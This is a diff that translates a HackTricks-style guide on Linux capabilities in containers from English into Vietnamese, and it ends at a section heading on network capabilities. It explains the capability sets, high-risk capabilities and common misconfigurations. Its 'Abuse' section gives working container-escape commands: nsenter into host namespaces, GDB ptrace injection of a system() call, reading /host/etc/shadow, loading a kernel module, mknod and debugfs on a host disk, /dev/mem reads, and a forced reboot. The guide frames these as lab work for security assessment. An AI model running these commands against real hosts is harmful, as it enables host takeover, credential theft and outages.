@@ -1,30 +1,30 @@
-# Linux Capabilities In Containers
+# Linux Capabilities Trong Containers
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## Overview
+## Tổng quan
 
-Linux capabilities are one of the most important pieces of container security because they answer a subtle but fundamental question: **what does "root" really mean inside a container?** On a normal Linux system, UID 0 historically implied a very broad privilege set. In modern kernels, that privilege is decomposed into smaller units called capabilities. A process may run as root and still lack many powerful operations if the relevant capabilities have been removed. <sup>[[1]](#references)</sup>
+Linux capabilities là một trong những thành phần quan trọng nhất của bảo mật container vì chúng trả lời một câu hỏi tinh tế nhưng cơ bản: **"root" thực sự có nghĩa là gì bên trong một container?** Trên hệ thống Linux thông thường, UID 0 theo truyền thống hàm ý một tập hợp quyền rất rộng. Trong các kernel hiện đại, những quyền đó được chia thành các đơn vị nhỏ hơn gọi là capabilities. Một process có thể chạy với quyền root nhưng vẫn thiếu nhiều thao tác mạnh nếu các capabilities tương ứng đã bị loại bỏ. <sup>[[1]](#references)</sup>
 
-Containers depend on this distinction heavily. Many workloads are still launched as UID 0 inside the container for compatibility or simplicity reasons. Without capability dropping, that would be far too dangerous. With capability dropping, a containerized root process can still perform many ordinary in-container tasks while being denied more sensitive kernel operations. That is why a container shell that says `uid=0(root)` does not automatically mean "host root" or even "broad kernel privilege". The capability sets decide how much that root identity is actually worth.
+Containers phụ thuộc nhiều vào sự phân biệt này. Nhiều workload vẫn được khởi chạy với UID 0 bên trong container vì lý do tương thích hoặc đơn giản. Nếu không loại bỏ capabilities, điều đó sẽ quá nguy hiểm. Khi đã loại bỏ capabilities, một process root trong container vẫn có thể thực hiện nhiều tác vụ thông thường bên trong container, đồng thời bị ngăn thực hiện các thao tác nhạy cảm hơn của kernel. Vì vậy, một shell trong container hiển thị `uid=0(root)` không tự động có nghĩa là "root trên host" hay thậm chí là "có quyền kernel rộng". Các tập capability quyết định danh tính root đó thực sự có quyền đến mức nào.
 
-For the full Linux capability reference and many abuse examples, see:
+Để xem tài liệu tham khảo đầy đủ về Linux capabilities và nhiều ví dụ về cách lạm dụng, hãy xem:
 
 {{#ref}}
 ../../../interesting-files-permissions/linux-capabilities.md
 {{#endref}}
 
-## Operation
+## Cách hoạt động
 
-Capabilities are tracked in several sets, including permitted, effective, inheritable, ambient, and bounding sets. For many container assessments, the exact kernel semantics of each set are less immediately important than the final practical question: **which privileged operations can this process successfully perform right now, and which future privilege gains are still possible?** <sup>[[1]](#references)</sup>
+Capabilities được theo dõi trong một số tập, bao gồm permitted, effective, inheritable, ambient và bounding. Với nhiều đánh giá container, ngữ nghĩa chính xác của từng tập trong kernel không quan trọng bằng câu hỏi thực tế cuối cùng: **process này hiện có thể thực hiện thành công những thao tác đặc quyền nào, và còn có thể đạt được những đặc quyền nào trong tương lai?** <sup>[[1]](#references)</sup>
 
-The reason this matters is that many breakout techniques are really capability problems disguised as container problems. A workload with `CAP_SYS_ADMIN` can reach a huge amount of kernel functionality that a normal container root process should not touch. A workload with `CAP_NET_ADMIN` becomes much more dangerous if it also shares the host network namespace. A workload with `CAP_SYS_PTRACE` becomes much more interesting if it can see host processes through host PID sharing. In Docker or Podman that may appear as `--pid=host`; in Kubernetes it usually appears as `hostPID: true`.
+Điều này quan trọng vì nhiều kỹ thuật breakout thực chất là vấn đề về capability được ngụy trang thành vấn đề về container. Một workload có `CAP_SYS_ADMIN` có thể truy cập rất nhiều chức năng kernel mà một process root thông thường trong container không nên chạm tới. Một workload có `CAP_NET_ADMIN` sẽ nguy hiểm hơn nhiều nếu nó cũng chia sẻ network namespace của host. Một workload có `CAP_SYS_PTRACE` sẽ đáng chú ý hơn nhiều nếu nó có thể nhìn thấy các process trên host thông qua việc chia sẻ PID của host. Trong Docker hoặc Podman, cấu hình này có thể xuất hiện dưới dạng `--pid=host`; trong Kubernetes, thường là `hostPID: true`.
 
-In other words, the capability set cannot be evaluated in isolation. It has to be read together with namespaces, seccomp, and MAC policy.
+Nói cách khác, không thể đánh giá tập capability một cách riêng lẻ. Cần xem xét nó cùng với namespaces, seccomp và chính sách MAC.
 
 ## Lab
 
-A very direct way to inspect capabilities inside a container is:
+Một cách rất trực tiếp để kiểm tra capabilities bên trong container là:
 
 ```bash
 docker run --rm -it debian:stable-slim bash
@@ -32,51 +32,51 @@ apt-get update && apt-get install -y libcap2-bin
 capsh --print
 ```
 
-You can also compare a more restrictive container with one that has all capabilities added:
+Bạn cũng có thể so sánh một container bị giới hạn nghiêm ngặt hơn với một container được thêm tất cả capabilities:
 
 ```bash
 docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 ```
 
-To see the effect of a narrow addition, try dropping everything and adding back only one capability:
+Để thấy tác động của việc chỉ bổ sung một phạm vi hẹp, hãy thử loại bỏ tất cả rồi chỉ thêm lại một capability:
 
 ```bash
 docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 ```
 
-These small experiments help show that a runtime is not simply toggling a boolean called "privileged". It is shaping the actual privilege surface available to the process.
+Những thử nghiệm nhỏ này giúp cho thấy runtime không chỉ bật/tắt một boolean có tên "privileged". Nó định hình bề mặt đặc quyền thực tế mà tiến trình có thể sử dụng.
 
-## High-Risk Capabilities
+## Capabilities rủi ro cao
 
-Capabilities become escape primitives only when their operation reaches a **host-governed resource**. The recurring high-risk combinations are:
+Capabilities chỉ trở thành primitive escape khi thao tác của chúng tác động đến **tài nguyên do host kiểm soát**. Các tổ hợp rủi ro cao thường gặp là:
 
-- **`CAP_SYS_ADMIN`** plus a host PID, block device, or writable kernel-control path. Joining a target mount namespace additionally requires `CAP_SYS_CHROOT`; mounting a block-based filesystem requires `CAP_SYS_ADMIN` in the initial user namespace.
-- **`CAP_SYS_PTRACE`** plus host PID visibility and an attachable host process. `CAP_SYS_ADMIN` is not required for ptrace injection.
-- **`CAP_DAC_OVERRIDE` or `CAP_DAC_READ_SEARCH`** plus a reachable host filesystem. These capabilities bypass different DAC checks but do not create a host filesystem view.
-- **`CAP_SYS_MODULE`** in the initial user namespace plus an accepted, kernel-compatible module. Ordinary Linux containers share the node kernel; VM or userspace-kernel runtimes change that boundary.
-- **`CAP_MKNOD`** in the initial user namespace plus a real host device that the device cgroup already permits. Creating a node does not bypass the device cgroup.
-- **`CAP_SYS_RAWIO`** plus an exposed and usable memory, I/O-port, PCI, or device-control interface.
-- **`CAP_SYS_BOOT`** plus the initial PID namespace for a host reboot, or a usable and permitted kexec path for kernel replacement.
-- **`CAP_NET_ADMIN`** in the host network namespace for direct node network-state control. **`CAP_NET_RAW`** can participate in a protocol-specific escape, but raw sockets alone are not a node shell.
+- **`CAP_SYS_ADMIN`** cùng với PID của host, thiết bị khối hoặc đường dẫn điều khiển kernel có quyền ghi. Để tham gia mount namespace mục tiêu, cần thêm `CAP_SYS_CHROOT`; để mount filesystem dựa trên thiết bị khối, cần `CAP_SYS_ADMIN` trong user namespace ban đầu.
+- **`CAP_SYS_PTRACE`** cùng với khả năng nhìn thấy PID của host và một tiến trình trên host có thể attach. Không cần `CAP_SYS_ADMIN` để inject qua ptrace.
+- **`CAP_DAC_OVERRIDE` hoặc `CAP_DAC_READ_SEARCH`** cùng với filesystem của host có thể truy cập. Các capability này bỏ qua những kiểm tra DAC khác nhau nhưng không tạo ra góc nhìn filesystem của host.
+- **`CAP_SYS_MODULE`** trong user namespace ban đầu cùng với một module được chấp nhận và tương thích với kernel. Các Linux container thông thường dùng chung kernel của node; runtime VM hoặc userspace-kernel thay đổi ranh giới này.
+- **`CAP_MKNOD`** trong user namespace ban đầu cùng với một thiết bị thực trên host mà device cgroup đã cho phép. Tạo node không vượt qua device cgroup.
+- **`CAP_SYS_RAWIO`** cùng với giao diện bộ nhớ, cổng I/O, PCI hoặc điều khiển thiết bị được expose và có thể sử dụng.
+- **`CAP_SYS_BOOT`** cùng với PID namespace ban đầu để reboot host, hoặc một đường dẫn kexec có thể sử dụng và được cho phép để thay kernel.
+- **`CAP_NET_ADMIN`** trong network namespace của host để trực tiếp kiểm soát trạng thái mạng của node. **`CAP_NET_RAW`** có thể tham gia vào một escape đặc thù giao thức, nhưng chỉ có raw socket thì không tạo được shell trên node.
 
-`CAP_SYS_CHROOT` is deliberately not listed as a standalone escape capability. It can be required by mount-namespace `setns()` and can make an already accessible host tree easier to use, but `chroot()` alone neither exposes that tree nor grants new filesystem permissions. Likewise, `CAP_BPF` and `CAP_PERFMON` expose powerful telemetry and kernel attack surface, but absent a separate kernel flaw their ordinary operations are not generic container escapes.
+Cố ý không liệt kê `CAP_SYS_CHROOT` như một capability escape độc lập. Capability này có thể cần thiết cho `setns()` vào mount namespace và có thể giúp sử dụng cây thư mục của host đã truy cập được, nhưng riêng `chroot()` không làm lộ cây thư mục đó hay cấp thêm quyền filesystem. Tương tự, `CAP_BPF` và `CAP_PERFMON` mở ra bề mặt telemetry và kernel mạnh mẽ, nhưng nếu không có lỗ hổng kernel riêng thì các thao tác thông thường của chúng không phải là cách escape container chung.
 
-## Runtime Usage
+## Cách runtime sử dụng
 
-Docker, Podman, containerd-based stacks, and CRI-O all use capability controls, but the defaults and management interfaces differ. Docker exposes them directly through flags such as `--cap-drop` and `--cap-add`. Podman exposes similar controls and commonly combines them with rootless execution as an additional safety layer. Kubernetes surfaces capability additions and drops through the Pod or container `securityContext`; lower-level runtimes express the resulting sets in the OCI runtime configuration. System-container environments such as LXC and Incus also rely on capability control, but their broader host integration can tempt operators to relax defaults more aggressively than they would for an application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>
+Docker, Podman, các stack dựa trên containerd và CRI-O đều sử dụng cơ chế kiểm soát capability, nhưng mặc định và giao diện quản lý khác nhau. Docker cho phép cấu hình trực tiếp qua các flag như `--cap-drop` và `--cap-add`. Podman có các tùy chọn tương tự và thường kết hợp chúng với việc chạy rootless như một lớp an toàn bổ sung. Kubernetes cho phép thêm và loại bỏ capability thông qua `securityContext` của Pod hoặc container; các runtime cấp thấp hơn biểu diễn các tập kết quả trong cấu hình runtime OCI. Các môi trường system-container như LXC và Incus cũng dựa vào cơ chế kiểm soát capability, nhưng khả năng tích hợp sâu hơn với host có thể khiến operator nới lỏng cấu hình mặc định mạnh tay hơn so với khi chạy application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>
 
-The same principle holds across all of them: a capability that is technically possible to grant is not necessarily one that should be granted. Many real-world incidents begin when an operator adds a capability simply because a workload failed under a stricter configuration and the team needed a quick fix.
+Nguyên tắc này áp dụng cho tất cả các môi trường trên: một capability có thể được cấp về mặt kỹ thuật không có nghĩa là nên cấp nó. Nhiều sự cố ngoài thực tế bắt đầu khi operator thêm capability chỉ vì workload không chạy được với cấu hình nghiêm ngặt hơn và nhóm cần một cách khắc phục nhanh.
 
-## Misconfigurations
+## Cấu hình sai
 
-The most obvious mistake is **`--cap-add=ALL`** in Docker/Podman-style CLIs, but it is not the only one. In practice, a more common problem is granting one or two extremely powerful capabilities, especially `CAP_SYS_ADMIN`, to "make the application work" without also understanding the namespace, seccomp, and mount implications. Another common failure mode is combining extra capabilities with host namespace sharing. In Docker or Podman this may appear as `--pid=host`, `--network=host`, or `--userns=host`; in Kubernetes the equivalent exposure usually appears through workload settings such as `hostPID: true` or `hostNetwork: true`. Each of those combinations changes what the capability can actually affect.
+Sai lầm dễ thấy nhất là dùng **`--cap-add=ALL`** trong CLI kiểu Docker/Podman, nhưng đó không phải là sai lầm duy nhất. Trên thực tế, vấn đề thường gặp hơn là cấp một hoặc hai capability cực kỳ mạnh, đặc biệt là `CAP_SYS_ADMIN`, để "làm cho ứng dụng hoạt động" mà không tìm hiểu các tác động liên quan đến namespace, seccomp và mount. Một lỗi phổ biến khác là kết hợp thêm capability với việc chia sẻ namespace của host. Trong Docker hoặc Podman, điều này có thể xuất hiện dưới dạng `--pid=host`, `--network=host` hoặc `--userns=host`; trong Kubernetes, mức độ expose tương đương thường xuất hiện qua các thiết lập workload như `hostPID: true` hoặc `hostNetwork: true`. Mỗi tổ hợp này đều thay đổi những gì capability thực sự có thể tác động đến.
 
-It is also common to see administrators believe that because a workload is not fully `--privileged`, it is still meaningfully constrained. Sometimes that is true, but sometimes the effective posture is already close enough to privileged that the distinction stops mattering operationally.
+Quản trị viên cũng thường cho rằng workload chưa chạy với `--privileged` thì vẫn bị giới hạn đáng kể. Đôi khi điều đó đúng, nhưng đôi khi cấu hình thực tế đã gần với privileged đến mức khác biệt này không còn ý nghĩa trong vận hành.
 
-## Abuse
+## Lạm dụng
 
-Start by recording the effective sets, user-namespace mapping, seccomp state, namespaces, mounts, and devices. A capability name without this context does not prove an escape:
+Trước tiên, hãy ghi lại các tập quyền hiệu lực, ánh xạ user namespace, trạng thái seccomp, namespace, mount và thiết bị. Tên capability nếu thiếu ngữ cảnh này không chứng minh được có escape:
 
 ```bash
 capsh --print
@@ -86,11 +86,11 @@ ls -l /proc/self/ns
 findmnt
 ```
 
-### `CAP_SYS_ADMIN`: namespaces and block devices
+### `CAP_SYS_ADMIN`: namespaces và thiết bị khối
 
-With host PID visibility, `CAP_SYS_ADMIN` can enter host namespaces. The mount-namespace operation also needs `CAP_SYS_CHROOT` in the caller's user namespace.
+Khi nhìn thấy PID của host, `CAP_SYS_ADMIN` có thể vào các namespace của host. Thao tác với mount namespace cũng cần `CAP_SYS_CHROOT` trong user namespace của tiến trình gọi.
 
-**Check the capability and confinement:**
+**Kiểm tra capability và cơ chế hạn chế:**
 
 ```bash
 capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
@@ -98,7 +98,7 @@ grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map /proc/self/gid_map
 ```
 
-**Enumerate the target:** confirm host PID sharing from the container/Pod configuration or an unmistakable host process list, then inspect the target namespaces. A local PID 1 exists in private PID namespaces too, so its presence alone does not prove host PID sharing.
+**Liệt kê mục tiêu:** xác nhận chia sẻ PID của host từ cấu hình container/Pod hoặc từ danh sách tiến trình host không thể nhầm lẫn, sau đó kiểm tra các namespace của mục tiêu. PID 1 cục bộ cũng tồn tại trong các PID namespace riêng tư, nên chỉ sự hiện diện của nó không chứng minh được việc chia sẻ PID của host.
 
 ```bash
 ps -eo pid,user,comm,args
@@ -107,7 +107,7 @@ tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
 ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
 ```
 
-**Exploit the namespace path:**
+**Khai thác đường dẫn namespace:**
 
 ```bash
 nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
@@ -115,9 +115,9 @@ id
 findmnt /
 ```
 
-The capability checks must succeed in the user namespaces that own the targets. `--pid=host` or Kubernetes `hostPID: true` supplies visibility; it does not supply the capabilities.
+Các kiểm tra capability phải thành công trong user namespace sở hữu các mục tiêu. `--pid=host` hoặc `hostPID: true` trong Kubernetes giúp nhìn thấy chúng; chúng không cấp capability.
 
-For the alternative block-device path, **enumerate** the candidates, then **exploit** the accessible filesystem by mounting the validated candidate read-only first:
+Đối với phương án dùng block device, hãy **enumerate** các mục có thể, sau đó **exploit** filesystem có thể truy cập bằng cách trước tiên mount mục đã xác thực ở chế độ chỉ đọc:
 
 ```bash
 lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
@@ -128,11 +128,11 @@ cat /mnt/hostdisk/etc/hostname
 umount /mnt/hostdisk
 ```
 
-The device node must exist, the device cgroup must allow it, and block-filesystem mounts require `CAP_SYS_ADMIN` in the initial user namespace. A host root already bind-mounted at `/host` is host access **without** `CAP_SYS_ADMIN`; `chroot /host` is only a convenience and separately requires `CAP_SYS_CHROOT`.
+Device node phải tồn tại, device cgroup phải cho phép nó, và các mount block filesystem cần `CAP_SYS_ADMIN` trong user namespace ban đầu. Host root đã được bind-mount tại `/host` đồng nghĩa với quyền truy cập host **mà không cần** `CAP_SYS_ADMIN`; `chroot /host` chỉ là tiện ích và cần riêng `CAP_SYS_CHROOT`.
 
-### Reachable host root: direct filesystem execution
+### Host root có thể truy cập: thực thi trực tiếp từ filesystem
 
-If the host root is already mounted at `/host`, first confirm the mount and then use the existing access directly. This path does not depend on `CAP_SYS_ADMIN`:
+Nếu host root đã được mount tại `/host`, trước tiên hãy xác nhận mount, sau đó sử dụng trực tiếp quyền truy cập hiện có. Cách này không phụ thuộc vào `CAP_SYS_ADMIN`:
 
 ```bash
 findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
@@ -140,20 +140,20 @@ ls -la /host
 chroot /host /bin/bash
 ```
 
-If `chroot()` is unavailable but the host binary is compatible with the container's architecture and loader, it can often be called through the mounted tree instead:
+Nếu `chroot()` không khả dụng nhưng binary của host tương thích với kiến trúc và loader của container, thường có thể gọi nó thông qua cây đã mount:
 
 ```bash
 /host/bin/bash -p
 export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
 ```
 
-Direct reads and writes under `/host` are already host-filesystem compromise. `chroot()` or executing a host binary only makes that access more convenient; neither operation creates the host mount or bypasses a read-only mount or MAC policy.
+Đọc và ghi trực tiếp trong `/host` đã đồng nghĩa với việc xâm phạm filesystem của host. `chroot()` hoặc thực thi binary của host chỉ giúp truy cập thuận tiện hơn; cả hai thao tác đều không tạo mount của host hay vượt qua mount chỉ đọc hoặc chính sách MAC.
 
-### `CAP_SYS_PTRACE`: host-process injection
+### `CAP_SYS_PTRACE`: inject vào process của host
 
-With host PID visibility and `CAP_SYS_PTRACE` in the target's user namespace, GDB can make an approved host process call `system()`. `CAP_SYS_ADMIN` is not required.
+Khi có thể nhìn thấy PID của host và có `CAP_SYS_PTRACE` trong user namespace của mục tiêu, GDB có thể khiến một process được phép của host gọi `system()`. Không cần `CAP_SYS_ADMIN`.
 
-**Check the capability and attachment controls:**
+**Kiểm tra capability và các biện pháp kiểm soát việc attach:**
 
 ```bash
 capsh --print | grep cap_sys_ptrace
@@ -162,7 +162,7 @@ cat /proc/self/uid_map
 cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
 ```
 
-**Enumerate and select a disposable target:** confirm host PID sharing from configuration or an unmistakable node process list; never select PID 1 or a critical daemon.
+**Liệt kê và chọn một tiến trình mục tiêu có thể loại bỏ:** xác nhận việc chia sẻ PID của host qua cấu hình hoặc danh sách tiến trình node không thể nhầm lẫn; không bao giờ chọn PID 1 hoặc daemon trọng yếu.
 
 ```bash
 ps -eo pid,user,comm,args
@@ -172,7 +172,7 @@ grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
   "/proc/${target_pid}/status"
 ```
 
-**Exploit the selected process:**
+**Khai thác tiến trình đã chọn:**
 
 ```bash
 # On a reachable assessment system:
@@ -186,20 +186,20 @@ gdb -q -nx -batch -p "${target_pid}" \
   -ex detach
 ```
 
-The target must be attachable and have a usable `system()` symbol and Bash payload path. Yama, non-dumpable state, seccomp, user namespaces, and MAC policy can block the chain. GDB stops the target while attached, so use only a disposable lab process.
+Tiến trình đích phải cho phép attach và có symbol `system()` cùng đường dẫn Bash payload khả dụng. Yama, trạng thái không thể dump, seccomp, user namespaces và chính sách MAC có thể chặn chuỗi này. GDB dừng tiến trình đích khi attach, vì vậy chỉ sử dụng tiến trình lab có thể loại bỏ.
 
-### `CAP_DAC_OVERRIDE` and `CAP_DAC_READ_SEARCH`: protected host files
+### `CAP_DAC_OVERRIDE` và `CAP_DAC_READ_SEARCH`: các tệp host được bảo vệ
 
-These capabilities do not expose the host filesystem. If `/host` is already a host mount, `CAP_DAC_READ_SEARCH` can bypass read/search DAC checks and `CAP_DAC_OVERRIDE` can additionally bypass ordinary write checks:
+Các capability này không làm lộ filesystem của host. Nếu `/host` đã là một host mount, `CAP_DAC_READ_SEARCH` có thể bỏ qua các kiểm tra DAC về đọc/tìm kiếm, còn `CAP_DAC_OVERRIDE` cũng có thể bỏ qua các kiểm tra ghi thông thường:
 
-**Check the capabilities:**
+**Kiểm tra các capability:**
 
 ```bash
 capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 ```
 
-**Enumerate the exposed host filesystem and target permissions:**
+**Liệt kê hệ thống tệp máy chủ bị phơi bày và quyền truy cập mục tiêu:**
 
 ```bash
 findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
@@ -208,7 +208,7 @@ stat -c 'owner=%u:%g mode=%A path=%n' \
 find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
 ```
 
-**Exercise the read and write bypasses** in a disposable lab:
+**Thử nghiệm các bypass quyền đọc và ghi** trong một môi trường lab dùng một lần:
 
 ```bash
 head -n 1 /host/etc/shadow
@@ -216,13 +216,13 @@ printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
 rm /host/root/ht-dac-proof
 ```
 
-A read-only mount and LSM rules still apply. `CAP_DAC_READ_SEARCH` also authorizes `open_by_handle_at()`, but a breakout such as Shocker additionally needs a mount file descriptor for the same underlying filesystem, valid or discoverable handles, a compatible filesystem/storage layout, and no runtime or LSM block. It does not provide arbitrary access to every filesystem outside the mount namespace.
+Mount ở chế độ chỉ đọc và các quy tắc LSM vẫn được áp dụng. `CAP_DAC_READ_SEARCH` cũng cho phép gọi `open_by_handle_at()`, nhưng để thoát container như trong Shocker, còn cần file descriptor của một mount thuộc cùng filesystem nền, các handle hợp lệ hoặc có thể tìm ra, bố cục filesystem/lưu trữ tương thích, đồng thời không bị runtime hay LSM chặn. Quyền này không cho phép truy cập tùy ý vào mọi filesystem bên ngoài mount namespace.
 
-### `CAP_SYS_MODULE`: shared-kernel execution
+### `CAP_SYS_MODULE`: thực thi trong kernel dùng chung
 
-In an ordinary Linux container, an accepted module runs in the shared host kernel.
+Trong một Linux container thông thường, module được chấp nhận sẽ chạy trong kernel dùng chung của host.
 
-**Check the capability and user-namespace scope:**
+**Kiểm tra capability và phạm vi user namespace:**
 
 ```bash
 capsh --print | grep cap_sys_module
@@ -230,7 +230,7 @@ grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 ```
 
-**Enumerate module-loading prerequisites:**
+**Liệt kê các điều kiện tiên quyết để tải module:**
 
 ```bash
 uname -r
@@ -241,7 +241,7 @@ grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
 modinfo /lab/ht-proof.ko
 ```
 
-**Exploit only with a compatible, pre-reviewed proof module on a disposable node:**
+**Exploit chỉ bằng proof module tương thích, được rà soát trước, trên node dùng một lần:**
 
 ```bash
 insmod /lab/ht-proof.ko
@@ -249,13 +249,13 @@ grep '^ht_proof ' /proc/modules
 rmmod ht_proof
 ```
 
-The capability must be effective in the initial user namespace. Kernel version and configuration, module signatures, lockdown, seccomp, and LSM policy must permit the load. Kata, gVisor, Hyper-V isolation, and similar runtimes change which kernel boundary the workload reaches.
+Capability phải có hiệu lực trong user namespace ban đầu. Phiên bản và cấu hình kernel, chữ ký module, lockdown, seccomp và chính sách LSM phải cho phép tải module. Kata, gVisor, Hyper-V isolation và các runtime tương tự làm thay đổi ranh giới kernel mà workload tiếp cận.
 
-### `CAP_MKNOD`: create a permitted device handle
+### `CAP_MKNOD`: tạo device handle được phép
 
-`CAP_MKNOD` creates a device node but does not bypass the device cgroup. Device creation is not namespaced, so the capability must be effective in the initial user namespace.
+`CAP_MKNOD` tạo device node nhưng không bỏ qua device cgroup. Việc tạo device không được namespaced, vì vậy capability phải có hiệu lực trong user namespace ban đầu.
 
-**Check the capability and user-namespace scope:**
+**Kiểm tra capability và phạm vi user namespace:**
 
 ```bash
 capsh --print | grep cap_mknod
@@ -263,7 +263,7 @@ grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 ```
 
-**Enumerate the real devices, their major/minor numbers, and any visible cgroup-v1 allowlist:**
+**Liệt kê các thiết bị thực tế, số major/minor của chúng và mọi allowlist cgroup-v1 hiển thị:**
 
 ```bash
 lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
@@ -273,7 +273,7 @@ done
 cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
 ```
 
-**Exploit a validated ext-family candidate read-only:**
+**Khai thác một ứng viên thuộc họ ext đã được xác thực theo chế độ chỉ đọc:**
 
 ```bash
 node_block_name=vda1                       # Replace with the validated candidate.
@@ -285,13 +285,13 @@ debugfs -R 'cat /etc/hostname' /dev/ht-node-root
 rm /dev/ht-node-root
 ```
 
-Other filesystems need a matching read-only tool; mounting the device additionally needs `CAP_SYS_ADMIN`. `Operation not permitted` when opening the created node usually indicates the device cgroup still blocks it. Under cgroup v2, device access is commonly enforced with BPF and no `devices.list` file exists, so a successful open is the decisive test.
+Các filesystem khác cần một công cụ chỉ đọc tương ứng; để mount thiết bị cũng cần `CAP_SYS_ADMIN`. Lỗi `Operation not permitted` khi mở node vừa tạo thường cho biết device cgroup vẫn chặn thao tác này. Với cgroup v2, quyền truy cập thiết bị thường được thực thi bằng BPF và không có tệp `devices.list`, vì vậy mở thành công là phép thử mang tính quyết định.
 
-### `CAP_SYS_RAWIO`: exposed raw-I/O interface
+### `CAP_SYS_RAWIO`: giao diện raw I/O bị lộ
 
-There is no portable generic payload: valid addresses and effects depend on hardware and kernel configuration.
+Không có payload tổng quát nào có thể dùng trên mọi hệ thống: địa chỉ hợp lệ và tác động phụ thuộc vào phần cứng và cấu hình kernel.
 
-**Check the capability and user-namespace scope:**
+**Kiểm tra capability và phạm vi user namespace:**
 
 ```bash
 capsh --print | grep cap_sys_rawio
@@ -299,7 +299,7 @@ grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 ```
 
-**Enumerate exposed raw interfaces, hardware, and drivers:**
+**Liệt kê các giao diện thô, phần cứng và trình điều khiển bị phơi lộ:**
 
 ```bash
 ls -l /dev/mem /dev/port 2>/dev/null
@@ -307,7 +307,7 @@ lspci -nnk 2>/dev/null
 find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
 ```
 
-**Exploit only with an approved proof for the identified device and address range.** If `/dev/mem` is the lab-approved interface, this template proves node-memory disclosure without printing its contents:
+**Chỉ exploit khi có proof được phê duyệt cho thiết bị và dải địa chỉ đã xác định.** Nếu `/dev/mem` là giao diện được phòng lab phê duyệt, template này chứng minh khả năng tiết lộ bộ nhớ của node mà không in nội dung của nó:
 
 ```bash
 approved_physical_address=<lab-provided-decimal-address>
@@ -319,13 +319,13 @@ sha256sum /tmp/ht-rawio-proof.bin
 rm /tmp/ht-rawio-proof.bin
 ```
 
-The address must come from the lab's hardware map because reading some MMIO regions can have side effects. A generic memory-write command would be misleading and unsafe: the same address can be harmless on one machine and control hardware or kernel memory on another. Device cgroups, filesystem permissions, strict `/dev/mem`, kernel lockdown, virtualization, and LSM policy commonly prevent useful access.
+Địa chỉ phải lấy từ sơ đồ phần cứng của lab vì việc đọc một số vùng MMIO có thể gây tác dụng phụ. Một lệnh ghi bộ nhớ chung chung sẽ gây hiểu nhầm và không an toàn: cùng một địa chỉ có thể vô hại trên máy này nhưng lại điều khiển phần cứng hoặc bộ nhớ kernel trên máy khác. Device cgroups, quyền hệ thống tệp, `/dev/mem` bị giới hạn nghiêm ngặt, kernel lockdown, ảo hóa và chính sách LSM thường ngăn cản việc truy cập hữu ích.
 
-### `CAP_SYS_BOOT`: namespace reboot or kernel replacement
+### `CAP_SYS_BOOT`: khởi động lại namespace hoặc thay thế kernel
 
-In a private PID namespace, `reboot()` terminates that namespace's init process rather than rebooting the host. Host reboot impact therefore needs the initial PID namespace, normally through host PID sharing. A kexec path also needs a compatible kernel image and permissive lockdown/signature policy:
+Trong PID namespace riêng, `reboot()` chấm dứt tiến trình init của namespace đó thay vì khởi động lại host. Vì vậy, để ảnh hưởng đến việc khởi động lại host cần có initial PID namespace, thường thông qua chia sẻ PID của host. Đường dẫn kexec cũng cần ảnh kernel tương thích và chính sách lockdown/chữ ký cho phép:
 
-**Check the capability:**
+**Kiểm tra capability:**
 
 ```bash
 capsh --print | grep cap_sys_boot
@@ -333,7 +333,7 @@ grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 ```
 
-**Enumerate the PID-namespace and kexec prerequisites:** confirm host PID sharing from the workload configuration because a PID namespace link alone does not reveal whether it is the node's initial namespace.
+**Liệt kê các điều kiện tiên quyết cho PID namespace và kexec:** xác nhận workload chia sẻ PID với host qua cấu hình workload, vì chỉ riêng liên kết đến PID namespace không cho biết đó có phải namespace ban đầu của node hay không.
 
 ```bash
 ps -p 1 -o pid,user,comm,args
@@ -342,27 +342,27 @@ command -v kexec 2>/dev/null
 cat /sys/kernel/security/lockdown 2>/dev/null
 ```
 
-**Exploit only when rebooting a disposable lab node is the explicit exercise:**
+**Chỉ khai thác khi khởi động lại một nút lab dùng một lần là bài tập được nêu rõ:**
 
 ```bash
 sync
 reboot -f
 ```
 
-Do not issue that command or load a kernel on a shared node merely to prove the capability. In a private PID namespace it terminates only that namespace's init process and does not demonstrate host impact.
+Không chạy lệnh đó hoặc nạp kernel trên node dùng chung chỉ để chứng minh capability. Trong PID namespace riêng, lệnh này chỉ kết thúc tiến trình init của namespace đó và không chứng minh được ảnh hưởng lên host.
 
-### `CAP_NET_ADMIN` and `CAP_NET_RAW`: host network paths
